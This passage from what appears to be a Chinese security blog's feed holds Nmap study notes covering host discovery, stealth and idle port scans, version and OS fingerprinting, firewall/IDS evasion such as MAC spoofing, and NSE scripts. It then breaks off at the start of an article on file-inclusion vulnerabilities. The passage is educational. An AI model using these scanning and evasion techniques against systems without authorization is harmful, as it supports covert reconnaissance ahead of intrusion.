<code>ACK</code>ping探测的原因是为了最大限度地绕过防火墙。该<code>-PA</code>选项使用与 SYN探测 (80) 相同的默认端口，并且还可以采用相同格式的目标端口列表。这种<code>ACK</code>数据包声称通过已建立的 TCP连接确认数据，但实际上并不存在这样的连接。因此，远程主机应始终响应一个<code>RST</code>数据包，在此过程中暴露自己的存在。</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202309281048781.png"alt="image-20230925153349280" /><figcaption aria-hidden="true">image-20230925153349280</figcaption></figure><h2 id="pu-udp-ping">2.6 -PU <port list> (UDP Ping)</h2><p>该方法会向指定端口发送<code>UDP</code>数据包。对于大多数端口，数据包都是空的，但有些端口会使用特定协议的有效载荷，这样更有可能得到响应。端口列表的格式与前面讨论过的-PS 和 -PA 选项相同。如果没有指定端口，默认值为40125。默认情况下使用的是一个非常不常用的端口，因为对于这种特殊的扫描类型来说，向开放端口发送数据通常是不可取的。一旦命中中目标计算机上的一个关闭端口，<code>UDP</code>探测器应返回一个 <code>ICMP</code>端口不可达数据包。这就向<code>Nmap</code>表明机器是正常运行的。许多其他类型的<code>ICMP</code>错误，如主机/网络不可到达或超过TTL，都表明主机已停机或不可到达。无响应也可以这样解释。如果到达的是开放端口，大多数服务会直接忽略空数据包，不返回任何响应。这就是默认探测端口为40125 的原因，该端口被使用的可能性很小。字符生成器<code>chargen</code>协议等少数服务会响应空 <code>UDP</code>数据包，从而向 <code>Nmap</code> 透露机器可用。</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202309281048782.png"alt="image-20230925153850582" /><figcaption aria-hidden="true">image-20230925153850582</figcaption></figure><h2 id="py-sctp-init-ping">2.7 -PY <port list> (SCTP INIT Ping)</h2><p>该选项发送包含最小<code>INIT</code> 块的 <code>SCTP</code>数据包。<code>INIT</code>块向远程系统表明，您正试图建立关联。通常情况下，目标端口关闭，并将发送一个<code>ABORT</code> 块。如果端口碰巧是开放的，目标系统将采取<code>SCTP</code>四次握手的第二步，用一个 <code>INIT-ACK</code> chunk作为回应。如果运行 <code>Nmap</code>的机器有一个功能正常的<code>SCTP</code>协议栈，那么它就会通过响应一个<code>ABORT</code>数据块而不是发送一个<code>COOKIE-ECHO</code>数据块（这将是四路握手的下一步）来破坏连接。<code>ABORT</code>包由运行<code>Nmap</code>的机器内核发送，以响应意外的<code>INIT-ACK</code>，而不是由<code>Nmap</code> 本身发送。前面讨论过的<code>ABORT</code>或<code>INIT-ACK</code> 响应都会告诉<code>Nmap</code>，主机是可用的并有响应。</p><h2 id="pe--pp--pm-icmp-ping-types">2.8 -PE; -PP; -PM (ICMP PingTypes)</h2><p><code>Nmap</code> 向目标<code>IP</code>地址发送<code>ICMP</code>类型8（回显请求）数据包，期望从可用主机返回类型 0（回显应答）。不幸的是，对于网络浏览器来说，许多主机和防火墙现在会阻止这些数据包，而不是按照RFC1122 的要求进行响应。 因此，针对 Internet 上的未知目标，仅<code>ICMP</code>扫描很少足够可靠。但对于监控内部网络的系统管理员来说，它们可能是一种实用且有效的方法。使用该-PE选项启用此回显请求行为。<code>ICMP</code>标准（RFC792 和 RFC 950）还将时间戳请求、信息请求和地址掩码请求数据包分别指定为代码 13、15 和17。时间戳和地址掩码查询可以分别使用 -PP和-PM选项发送。</p><h2 id="po-ip-协议-ping">2.9 -PO <protocol list>(IP 协议 Ping)</h2><p><code>IP</code>协议 ping 是较新的主机发现选项之一，它发送的<code>IP</code>数据包在其 <code>IP</code>头中设置了指定的协议号。协议列表的格式与前面讨论的<code>TCP</code>、<code>UDP</code>和 <code>SCTP</code>主机发现选项中的端口列表相同。此主机发现方法查找使用与探针相同的协议的响应，或者查找表示目标主机不支持给定协议的<code>ICMP</code>协议不可达消息。无论哪种类型的响应都表明目标主机存活。</p><h2 id="prarp-ping">2.10 -PR(ARP Ping)</h2><p>当启动<code>Namp</code>主机发现时候，<code>Nmap</code>会对目标地址参数进行检查，如果与自身<code>IP</code>地址匹配到同一个子网内，<code>Nmap</code>会对该类目标采用<code>ARP</code>协议进行探测。即使命令参数规定的是其他探测手段，也会先使用<code>ARP</code>进行探测。这种方式效率高，速度快，但仅限于同一子网广播域中。<code>ARP</code>（AddressResolutionProtocol，地址解析协议）是用来将<code>IP</code>地址解析为<code>MAC</code>地址的协议。主机或三层网络设备上会维护一张<code>ARP</code>表，用于存储<code>IP</code>地址和<code>MAC</code>地址的映射关系，一般<code>ARP</code>表项包括动态<code>ARP</code>表项和静态<code>ARP</code>表项。</p><h2 id="disable-arp-ping-no-arp-or-nd-ping">2.11 --disable-arp-ping (NoARP or ND Ping)</h2><p><code>Nmap</code> 通常会发现本地连接的以太网主机的 <code>ARP</code>或 <code>IPv6</code>邻居发现 (ND)，即使使用了 <code>-Pn</code>或<code>-PE</code>等其他主机发现选项。要禁用这种隐式行为，请使用<code>--disable-arp-ping</code>选项。</p><h2 id="discovery-ignore-rst">2.12 --discovery-ignore-rst</h2><p>在某些情况下，防火墙可能会欺骗 <code>TCP</code> 重置(<code>RST</code>) 回复，以响应对未占用或不允许的地址的探测。由于<code>Nmap</code>通常会将 <code>RST</code>回复视为目标已启动的证明，这可能导致浪费扫描不存在的目标的时间。使用<code>--discovery-ignore-rst</code>会阻止<code>Nmap</code>在发现主机时考虑这些回复。您可能需要选择额外的主机发现选项，以确保在这种情况下不会错过目标。</p><h2 id="traceroute跟踪主机路径">2.13 --traceroute(跟踪主机路径)</h2><p><code>Traceroute</code>的工作原理是发送TTL（生存时间）较低的数据包，试图从扫描器和目标主机之间的中间跳诱发<code>ICMP</code>时间超限信息。标准的<code>traceroute</code> 实现以 1 的 TTL 开始，并递增 TTL直到到达目标主机。<code>Nmap</code>的<code>traceroute</code>从高TTL开始，然后递减TTL，直到TTL为零。这样做可以让<code>Nmap</code>采用巧妙的缓存算法，加快对多台主机的跟踪。根据网络条件，<code>Nmap</code>平均每台主机少发送5-10 个数据包。如果扫描的是单个子网（如192.168.0.0/24），<code>Nmap</code>可能只需向大多数主机发送两个数据包。</p><h1 id="端口扫描">3 端口扫描</h1><h2 id="端口状态">3.1 端口状态</h2><ul><li><code>open</code></li><li><code>closed</code></li><li><code>filterd</code></li><li><code>unfilterd</code></li><li><code>open|unfilterd</code></li><li><code>closed|unfilterd</code></li></ul><h2 id="概述-1">3.2 概述</h2><ul><li><p>虽然 Nmap试图生成准确的结果，但请记住，它的所有见解都是基于目标机器（或它们前面的防火墙）返回的数据包。这类主机可能不值得信任，它们发送的响应会迷惑或误导Nmap。更常见的是不符合 RFC 标准的主机，它们不会对 Nmap探测作出应有的响应。FIN、NULL 和 Xmas扫描特别容易出现这种问题。</p></li><li><p>大多数扫描类型只有特权用户才能使用。这是因为发送和接收原始数据包需要Unix 系统的 root 访问权限。</p></li><li><p>本节记录了 Nmap支持的十几种端口扫描技术。一次只能使用一种方法，除了 UDP 扫描 (-sU)和任何一种 SCTP 扫描类型 (-sY, -sZ) 可以与任何一种 TCP扫描类型结合使用。为便于记忆，端口扫描类型选项的形式为 -s<C>，其中 <C>是扫描名称中的一个突出字符，通常是第一个字符。唯一的例外是已废弃的 FTP反弹扫描 (-b)。默认情况下，Nmap 执行 SYN扫描，但如果用户没有发送原始数据包的适当权限（在 Unix 上需要 root访问权限），Nmap会用连接扫描代替。在本节列出的扫描中，非特权用户只能执行连接和 FTP反弹扫描。</p></li></ul><h2 id="ss-tcp-syn-scan">3.3 <code>-sS</code> (TCP SYN scan)</h2><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202309281048783.png"alt="image-20230928092641400" /><figcaption aria-hidden="true">image-20230928092641400</figcaption></figure><ul><li>半连接扫描基于TCP三次握手规则，探测服务端口是否开放。</li><li>服务端口开放，会返回 SYN/ACK 消息；如果收到 SYN 数据包（不含 ACK标志）的响应，端口也会被认为是开放的。这可能是由于一种极为罕见的 TCP功能造成的，这种功能被称为同时打开或分裂握手连接。</li><li>服务端口关闭，会返回RST消息。</li><li>如果数次重发后仍没响应，该端口就被标记为被过滤。如果收到ICMP不可到达错误(类型3，代码1，2，3，9，10，或者13)，该端口也被标记为被过滤。</li><li>优点：一般不会被目标主机的应用所记录。</li><li>缺点：运行Raw Socket时必须拥有管理员权限。</li></ul><h2 id="st-tcp-connect-scan">3.4 <code>-sT</code> (TCP connectscan)</h2><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202309281048784.png"alt="image-20230928092955007" /><figcaption aria-hidden="true">image-20230928092955007</figcaption></figure><ul><li>左边为服务端，右边为客户端。</li><li>当 无法使用SYN 扫描时，TCP 连接扫描是默认的 TCP扫描类型。当用户没有原始数据包权限时就是这种情况。</li><li>Nmap 不像大多数其他扫描类型那样写入原始数据包，而是通过发出 connect系统调用，使用此 API来获取每次连接尝试的状态信息，而不是从网上读取原始数据包响应。</li><li>优点：实现简单、可以用普通用户权限执行</li><li>缺点：容易被目标应用日志所记录</li></ul><h2 id="su-udp-scans">3.5 <code>-sU</code> (UDP scans)</h2><ul><li>虽然互联网上大多数流行服务都是通过 TCP 协议运行的，但 UDP服务也被广泛部署。DNS、SNMP 和 DHCP（注册端口 53、161/162 和67/68）是最常见的三种服务。</li><li>UDP 扫描使用 -sU 选项激活。它可以与 SYN 扫描 (-sS) 等 TCP扫描类型结合使用，在同一运行过程中同时检查两种协议。</li><li>如果返回 ICMP 端口不可到达错误（类型 3，代码3），端口将被关闭。</li><li>其他 ICMP 不可到达错误（类型 3，代码 0、1、2、9、10 或13）会将端口标记为已过滤。</li><li>偶尔，服务会响应一个 UDP 数据包，证明它是开放的。</li><li>如果重传后没有收到响应，端口就会被归类为 "开放"|"已过滤"。</li><li>缺点：扫描速度慢。解决方案：并行扫描更多主机、先对常用端口进行快速扫描、从防火墙后面进行扫描，以及使用--host-timeout 跳过慢速主机。</li></ul><h2 id="sy-sctp-init-scan">3.6 <code>-sY</code> (SCTP INIT scan)</h2><ul><li>SCTP 是 TCP 和 UDP 协议的一种相对较新的替代协议，它结合了 TCP 和 UDP协议的大多数特性，并增加了新的功能，如multi-homing和multi-streaming。</li><li>这种技术通常被称为半开扫描，因为你不会打开一个完整的 SCTP关联。您发送的是 INIT块，就好像您要打开一个真正的关联，然后等待响应。</li><li>INIT-ACK 块表示端口正在监听（打开）。</li><li>ABORT 块则表示端口未监听。</li><li>如果数次重传后仍未收到响应，端口就会被标记为已被过滤。如果收到 ICMP不可到达错误（类型 3，代码 0、1、2、3、9、10 或13），端口也会被标记为已过滤。</li></ul><h2 id="sn--sf--sx-tcp-null-fin-and-xmas-scans">3.7 <code>-sN</code>;<code>-sF</code>; <code>-sX</code> (TCP NULL, FIN, and Xmas scans)</h2><ul><li>假设扫描系统遵循RFC标准，如果收到一个RST报文，该端口被认为是closed(关闭的)</li><li>没有响应则意味着端口是open|filtered(开放或者被过滤的)</li><li>如果收到ICMP不可到达错误(类型 3，代号1，2，3，9，10，或者13)，该端口就被标记为被过滤的。</li><li>优点：它们能躲过一些无状态防火墙和报文过滤路由器，不会被记录到日志</li><li>缺点：大部分系统并不遵循该标准</li><li>FIN扫描 (-sF)：只设置TCP FIN标志位。</li><li>Null扫描 (-sN)：不设置任何标志位(tcp标志头是0)</li><li>Xmas扫描 (-sX)：设置FIN，PSH，和URG标志位</li><li>除了探测报文的标志位不同，这三种扫描在行为上完全一致。</li><li>主要优势：它们可以偷偷穿过某些非状态防火墙和数据包过滤路由器。另一个优势是，这些扫描类型甚至比SYN 扫描更隐蔽。</li></ul><h2 id="sa-tcp-ack-scan">3.8 <code>-sA</code> (TCP ACK scan)</h2><ul><li>ACK 扫描探测包只设置 ACK 标志（除非使用 --scanflags）。</li><li>扫描未过滤系统时，打开和关闭的端口都会返回一个 RST 数据包。Nmap会将这些端口标记为未过滤端口，这意味着 ACK数据包可以到达这些端口，但无法确定这些端口是开放的还是关闭的。</li><li>没有响应或发送某些 ICMP 错误信息（类型 3，代码 0、1、2、3、9、10 或13）的端口会被标记为已过滤。</li></ul><h2 id="sw-tcp-window-scan">3.9 <code>-sW</code> (TCP Window scan)</h2><ul><li>窗口扫描与 ACK扫描完全相同，只是它利用某些系统的实现细节来区分开放端口和关闭端口。</li><li>在某些系统中，开放端口使用正窗口大小（即使是 RST数据包），而关闭端口的窗口大小为零。</li><li>这种扫描依赖于互联网上少数系统的实现细节，因此不能总是相信它。</li></ul><h2 id="sm-tcp-maimon-scan">3.10 <code>-sM</code> (TCP Maimon scan)</h2><ul><li>该技术与 NULL、FIN 和 Xmas 扫描完全相同，只是探针是 FIN/ACK。</li><li>根据 RFC 793（TCP），无论端口是开放还是关闭，都应该生成一个 RST数据包来响应这种探测。</li><li>不过，Uriel 注意到，如果端口是开放的，许多 BSD衍生系统会直接丢弃数据包。</li></ul><h2 id="scanflags-custom-tcp-scan">3.11 <code>--scanflags</code> (CustomTCP scan)</h2><ul><li>--scanflags 参数可以是一个数字标志值，如 9（PSH 和FIN），但使用符号名称更方便。</li><li>除了指定所需的标记外，还可以指定 TCP 扫描类型（如 -sA 或-sF）。</li></ul><h2 id="sz-sctp-cookie-echo-scan">3.12 <code>-sZ</code> (SCTP COOKIEECHO scan)</h2><ul><li>利用了 SCTP 实现应在开放端口上静默丢弃包含 COOKIE ECHO块的数据包，但在端口关闭时发送 ABORT 的事实。</li><li>这种扫描类型的优点是，它的端口扫描不像 INIT扫描那么明显。此外，非状态防火墙规则集可能会阻止 INIT 数据块，但不会阻止COOKIE ECHO 数据块。不要以为这样就能使端口扫描不可见；好的 IDS也能检测到 SCTP COOKIE ECHO 扫描。</li><li>缺点是 SCTP COOKIE ECHO扫描无法区分开放端口和过滤端口，因此在两种情况下都会出现 open|filtered状态。</li></ul><h2 id="si-idle-scan">3.13 <code>-sI</code><zombie host>[:<probeport>](idle scan)</h2><ul><li>这种先进的扫描方法允许对目标进行真正的盲 TCP端口扫描（这意味着不会从您的真实 IP地址向目标发送数据包）。相反，一种独特的侧信道攻击会利用僵尸主机上可预测的IP 碎片 ID 序列生成来收集目标机开放端口的信息。</li><li>这种扫描类型还允许绘制机器之间基于 IP 的信任关系图。</li><li>如果您想探测僵尸主机上的特定端口，以了解 IP ID的变化，您可以在僵尸主机后添加冒号和端口号。否则 Nmap 将使用默认用于 TCPping 的端口 (80)。</li></ul><h2 id="so-ip-protocol-scan">3.14 <code>-sO</code> (IP protocolscan)</h2><ul><li>IP 协议扫描允许您确定目标计算机支持哪些 IP 协议（TCP、ICMP、IGMP等）。</li><li>如果 Nmap 从目标主机收到任何协议的响应，Nmap就会将该协议标记为打开。</li><li>ICMP 协议不可到达错误（类型 3，代码2）会导致协议被标记为关闭，而端口不可到达（类型 3，代码3）会导致协议被标记为打开。</li><li>其他 ICMP 不可到达错误（类型 3，代码 0、1、9、10 或13）会导致协议被标记为已过滤（尽管它们同时证明 ICMP 是开放的）。</li><li>如果重传后仍未收到响应，则标记为协议已打开|已过滤</li></ul><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202309281048785.png"alt="image-20230928100330382" /><figcaption aria-hidden="true">image-20230928100330382</figcaption></figure><h2 id="bftp-bounce-scan">3.15 <code>-b</code><FTP relay host>(FTPbounce scan)</h2><ul><li>利用FTP 服务器对其他主机进行端口扫描。只需让 FTP服务器依次向目标主机的每个感兴趣的端口发送文件即可。</li><li>错误信息将说明端口是否开放。</li><li>这是一种绕过防火墙的好方法，因为企业的 FTP服务器通常比任何旧的互联网主机更容易访问其他内部主机。</li><li>该漏洞现已基本修复。</li></ul><h1 id="服务和版本检测">4 服务和版本检测</h1><h2 id="sv-version-detection">4.1 <code>-sV</code> (Versiondetection)</h2><p>-sR 是 -sV 的别名。</p><h2 id="allports-dont-exclude-any-ports-from-version-detection">4.2<code>--allports</code> (Don't exclude any ports from versiondetection)</h2><p>默认情况下，Nmap 版本检测会跳过 TCP 9100端口，因为有些打印机会简单地打印发送到该端口的任何内容，导致几十页的HTTP GET 请求、二进制 SSL 会话请求等。</p><h2 id="version-intensity-intensity-set-version-scan-intensity">4.3<code>--version-intensity &lt;intensity&gt;</code> (Set version scanintensity)</h2><p>执行版本扫描 (-sV) 时，Nmap 会发送一系列探针，每个探针的稀有度值介于1 到 9之间。编号较低的探针对各种常见服务有效，而编号较高的探针则很少有用。强度级别规定了应使用哪些探针。数字越大，正确识别服务的可能性就越大。不过，高强度扫描需要更长的时间。强度必须在0 到 9 之间。通过 nmap-service-probes ports指令向目标端口注册探针时，无论强度级别如何，都会尝试该探针。这样可以确保DNS 探测总是针对任何开放的 53 端口，SSL 探测针对 443 端口等。</p><h2 id="version-light-enable-light-mode">4.4<code>--version-light</code> (Enable light mode)</h2><p>这是 --version-intensity 2的别名。这种轻度模式使版本扫描速度更快，但识别服务的可能性略低。</p><h2 id="version-all-try-every-single-probe">4.5<code>--version-all</code> (Try every single probe)</h2><p>--version-intensity 9 的别名，确保对每个端口都进行一次探测。</p><h2 id="version-trace-trace-version-scan-activity">4.6<code>--version-trace</code> (Trace version scan activity)</h2><p>这会导致 Nmap 打印出大量关于版本扫描正在进行的调试信息。它是--packet-trace 的子集。</p><h1 id="操作系统检测">5 操作系统检测</h1><p>Nmap 最著名的功能之一是使用 TCP/IP 堆栈指纹进行远程操作系统检测。Nmap向远程主机发送一系列 TCP 和 UDP数据包，并检查响应中的几乎每一位。在执行了数十项测试（例如 TCP ISN采样、TCP 选项支持和排序、IP ID 采样以及初始窗口大小检查）后，Nmap将结果与它的结果进行比较 <code>nmap-os-db</code> 数据库包含 2,600多个已知操作系统指纹，如果匹配则打印出操作系统详细信息。</p><h2 id="o-enable-os-detection">5.1 <code>-O</code> (Enable OSdetection)</h2><p>启用操作系统检测</p><h2 id="osscan-limit-limit-os-detection-to-promising-targets">5.2<code>--osscan-limit</code> (Limit OS detection to promisingtargets)</h2><p>如果发现至少一个打开的 TCP 端口和一个关闭的 TCP端口，操作系统检测就会有效得多。设置此选项后，Nmap甚至不会尝试对不符合此标准的主机进行操作系统检测。这可以节省大量时间，特别是在对许多主机进行-Pn 扫描时。它只在使用 -O 或 -A 请求操作系统检测时才起作用。</p><h2 id="osscan-guess---fuzzy-guess-os-detection-results">5.3<code>--osscan-guess</code>; <code>--fuzzy</code> (Guess OS detectionresults)</h2><p>允许进行近似匹配</p><h2id="max-os-tries-set-the-maximum-number-of-os-detection-tries-against-a-target">5.4<code>--max-os-tries</code> (Set the maximum number of OS detectiontries against a target)</h2><p>当 Nmap对目标执行操作系统检测但未能找到完美匹配时，它通常会重复尝试。默认情况下，如果条件有利于提交操作系统指纹，Nmap会尝试五次；如果条件不太好，Nmap 会尝试两次。</p><h1 id="nmap常用命令">6 Nmap常用命令</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 获取远程主机的系统类型及开放端口</span><br>nmap -sS -P0 -sV -O &lt; target &gt;<br><span class="hljs-comment"># 其他选项</span><br><span class="hljs-comment"># -A 同时打开操作系统指纹和版本检测</span><br><span class="hljs-comment"># -v 详细输出扫描情况.</span><br>nmap -sS -P0 -A -v &lt; target &gt;<br></code></pre></td></tr></table></figure><p>参考资料：</p><ol type="1"><li><code>Nmap</code>官方文档：https://nmap.org/book/man.html</li><li>https://cshihong.github.io/2019/09/24/nmap%E6%89%AB%E6%8F%8F%E5%B7%A5%E5%85%B7%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</li><li>https://bbs.sangfor.com.cn/forum.php?mod=viewthread&amp;tid=141607</li></ol>]]></content>
    
    
    <categories>
      
      <category>安全服务</category>
      
      <category>渗透测试工具</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Nmap</title>
    <link href="/2023/11/13/%E5%AE%89%E5%85%A8%E6%9C%8D%E5%8A%A1/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%B7%A5%E5%85%B7/Nmap/"/>
    <url>/2023/11/13/%E5%AE%89%E5%85%A8%E6%9C%8D%E5%8A%A1/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%B7%A5%E5%85%B7/Nmap/</url>
    
    <content type="html"><![CDATA[<h1 id="nmap介绍">1. Nmap介绍</h1><p><strong>简介：</strong></p><ul><li>Nmap是Linux下一款开源免费的网络发现（NetworkDiscovery）和安全审计（Security Auditing）工具，软件名字Nmap是NetworkMapper的简称。</li><li>Nmap使用原始IP报文来发现网络上有哪些主机，这些主机提供什么服务（应用程序名和版本），服务运行在什么操作系统，它们使用什么类型的报文过滤器/防火墙，以及一些其他功能。</li></ul><p><strong>功能：</strong></p><ul><li>主机发现</li><li>端口扫描</li><li>应用程序与版本信息侦测</li><li>操作系统侦测</li><li>规避FW/IDS</li><li>NSE脚本定制与使用</li></ul><p><strong>Nmap命令语法格式：</strong><code>nmap【空格】【选项|多选项|协议】【空格】【扫描目标说明】</code></p><p><strong>常用命令：</strong></p><ul><li>默认扫描：<code>nmap &lt;目标地址&gt;</code></li><li>全面扫描：<code>nmap -A -T 4 -V &lt;目标地址&gt;</code></li></ul><h1 id="主机发现">2. 主机发现</h1><p><strong>目标：</strong></p><p>确定目标主机是否在线(Alive，处于开启状态）</p><p><strong>原理：</strong></p><p>与ping命令类似，发送探测包到目标主机，如果收到回复，则说明目标主机是开启的</p><p><strong>命令选项：</strong></p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202311131542942.png"alt="image-20231113150045493" /><figcaption aria-hidden="true">image-20231113150045493</figcaption></figure><p><strong>说明：</strong></p><ul><li>局域网内执行ping扫描：在局域网内，无论采用哪一种选项，Nmap都是通过<strong>ARP</strong>包来询问IP地址上的主机是否活动的，如果收到ARP回复包，那么说明主机在线。</li><li>跨网段执行ping扫描：扫描跨网段目标主机时，使用-sP或-sn选项，默认情况下Nmap会依次发送4种不同类型的数据包(ICMPecho request、TCP SYN packet to port 443、TCP ACK packet to port80、ICMP timestamprequest）来探测目标主机是否在线，只要收到其中一个包的回复，就证明目标机在线。</li></ul><h1 id="端口扫描">3. 端口扫描</h1><p><strong>目标：</strong></p><p>确定目标主机的TCP/UDP端口的开放情况</p><p><strong>原理：</strong></p><p>发送TCP、UDP等类型的探测包到目标端口，根据收到的回复包判定端口是否开放</p><p><strong>端口的六个状态：</strong></p><ul><li>open:端口是开放的</li><li>closed:端口是关闭的</li><li>filtered:端口被防火墙IDS/IPS屏蔽，无法确定其状态</li><li>unfiltered:端口没有被屏蔽，但是否开放需要进一步确定</li><li>open|filtered:端口是开放的或被屏蔽</li><li>closed|filtered︰端口是关闭的或被屏蔽</li></ul><p><strong>命令选项：</strong></p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202311131542943.png"alt="image-20231113150721479" /><figcaption aria-hidden="true">image-20231113150721479</figcaption></figure><p><strong>说明：</strong></p><p>关于-p选项的说明：默认情况下，Nmap仅对用-p指定的TCP端口进行扫描，扫描方式为-sS(TCPSYN扫描）。如果既要扫描TCP端口，又要扫描UDP端口，则可以用“T:““U:”参数指定目标端口，并指定-sU(UDP扫描方式）和至少—种TCP扫描方式，如：<code>nmap-p T:139,U:53 -sS -sU 192.168.40.178</code></p><h2 id="tcp-syn扫描原理">3.1 TCP SYN扫描原理</h2><p>Nmap向目标端口发送TCPSYN报文，如果目标机返回TCPSYN+ACK报文，则说明目标端口处于开放状态，同时Nmap会紧接着向目标机发送TCPRST报文以重置此连接;如果目标机返回TCPRST+ACK报文，则说明目标端口处于关闭状态。</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202311131542944.png"alt="image-20231113151244885" /><figcaption aria-hidden="true">image-20231113151244885</figcaption></figure><h2 id="tcp-connect扫描原理">3.2 TCP connect扫描原理</h2><p>Nmap向目标端口发送TCPSYN报文，如果目标机返回TCPSYN+ACK报文，则说明目标端口处于开放状态，同时Nmap会紧接着向目标机依次发送TCPACK、TCP RST+ACK完成三次握手和重置此连接;如果目标机返回TCPRST+ACK报文，则说明目标端口处于关闭状态。</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202311131542945.png"alt="image-20231113151504128" /><figcaption aria-hidden="true">image-20231113151504128</figcaption></figure><h2 id="tcp-ack扫描原理">3.3 TCP ACK扫描原理</h2><p>Nmap向目标端口发送TCPACK报文，无论目标端口是否处于开放状态，目标机都会返回TCPRST报文。如果Nmap主机能收到此TCPRST报文，则说明目标端口未被防火墙屏蔽。TCPACK扫描只能用于确定防火墙是否屏蔽某个端口，可以辅助TCPSYN的方式来判断目标主机防火墙的状况。</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202311131542946.png"alt="image-20231113151735708" /><figcaption aria-hidden="true">image-20231113151735708</figcaption></figure><h2 id="隐蔽扫描原理">3.4 隐蔽扫描原理</h2><ul><li>Nmap向目标端口发送TCPFIN(-SF）/NULL（sN）/FIN+PSH+URG（-sX）报文，对于Linux系统的目标机，如果目标机未响应，则说明目标端口处于开放状态或被防火墙屏蔽;如果目标机返回TCPRST+ACK报文，则说明目标端口处于关闭状态。</li><li>对于Windows系统的目标机，无论目标端口处于开放还是关闭状态，目标机都会返回TCPRST+ACK报文。</li><li>因此，隐蔽扫描方式适合于Linux系统的目标机端口扫描。</li></ul><h1 id="应用程序与版本信息侦测">4. 应用程序与版本信息侦测</h1><p><strong>目标：</strong></p><p>识别目标主机开放的TCP/UDP端口上运行的服务及版本信息</p><p><strong>命令选项：</strong></p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202311131542947.png"alt="image-20231113152420343" /><figcaption aria-hidden="true">image-20231113152420343</figcaption></figure><h1 id="操作系统侦测">5. 操作系统侦测</h1><p><strong>目标：</strong></p><p>识别目标主机操作系统的类型</p><p><strong>侦测方法：</strong></p><p>网络协议栈指纹识别技术</p><p><strong>常用的网络协议栈指绞识别方法：</strong></p><ul><li>TTL</li><li>DF位</li><li>Window Size</li><li>ACK序号</li><li>对FIN包的响应</li><li>ISN</li><li>主机使用的端口</li></ul><p><strong>命令选项：</strong></p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202311131542948.png"alt="image-20231113152759394" /><figcaption aria-hidden="true">image-20231113152759394</figcaption></figure><h1 id="规避fwids">6. 规避FW/IDS</h1><p><strong>目标：</strong></p><p>绕过目标主机的防火墙、入侵检测系统等防护手段</p><p><strong>命令选项：</strong></p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202311131542949.png"alt="image-20231113152959757" /><figcaption aria-hidden="true">image-20231113152959757</figcaption></figure><p><strong>说明：</strong></p><ul><li>使用-T（0~5）可以启用时序选项，一般来说，数字越大，速度越快，精度越低，默认值为3。</li><li>--spoof-mac选项：<code>nmap--spoof-mac 0 &lt;目标IP&gt;</code>，其中参数0表示随机分配一个MAC地址，也可以手动指定MAC地址。</li></ul><h1 id="nes脚本的简单应用">7. NES脚本的简单应用</h1><ul><li><p>除了常规的网络扫描，Nmap还可根据NSE(Nmap scriptingEngine）的脚本进行大量渗透工作，这种脚本基于Lua语言编写。</p></li><li><p>脚本存放自录:<code>/usr/share/nmap/scripts/</code></p></li><li><p>命令选项：</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202311131542950.png"alt="image-20231113153503619" /><figcaption aria-hidden="true">image-20231113153503619</figcaption></figure></li></ul><h1 id="扫描结果保存与输出">8. 扫描结果保存与输出</h1><ul><li>normal:标准模式（选项-oN）</li><li>xml文档:(选项-oX)</li><li>grep文件(选项-oG）</li><li>-oA选项可将扫描结果以标准格式、XML、Grep格式一次性全部保存</li><li><code>nmap -sS -oN out.txt 192.168.40.182</code></li></ul>]]></content>
    
    
    <categories>
      
      <category>安全服务</category>
      
      <category>渗透测试工具</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>文件包含</title>
    <link href="/2023/11/12/%E5%AE%89%E5%85%A8%E6%9C%8D%E5%8A%A1/Web%E6%B8%97%E9%80%8F/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"/>
    <url>/2023/11/12/%E5%AE%89%E5%85%A8%E6%9C%8D%E5%8A%A1/Web%E6%B8%97%E9%80%8F/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/</url>
    
    <content type="html"><![CDATA[<h1 id="文件包含概述">1. 文件包含概述</h1><h2 id="原理">1.1 原理</h2><ul><li><p>文件包含：把可重复使用的函数写入到单个文件中，在需要使用该函数时，直接调用此文件，无需再次编写函数。这一调用文件的过程被称为包含。</p></li><li><p>文件包含漏洞原理：和SQL注入等攻击方式一样，文件包含漏洞也是一种注入型漏洞，其<strong>本质</strong>就是输入一段用户能够控制的脚本或者代码，并让服务端执行。有时候由于网站功能需求，会让前端用户选择要包含的文件，而开发人员又没有对要包含的文件进行安全考虑，就导致攻击者可以通过修改文件的位置来让后台执行任意文件，从而导致文件包含漏洞。</p></li><li><p>注：几乎所有的脚本语言都会提供文件包含的功能，但文件包含漏洞在PHPwebApplication中居多，而在JSP、ASP、ASP.NET程序中却非常少，这是有些语言设计的弊端。在PHP中经常出现文件包含漏洞，但并不意味着其他语言不存在。</p></li></ul><h2 id="文件包含函数">1.2 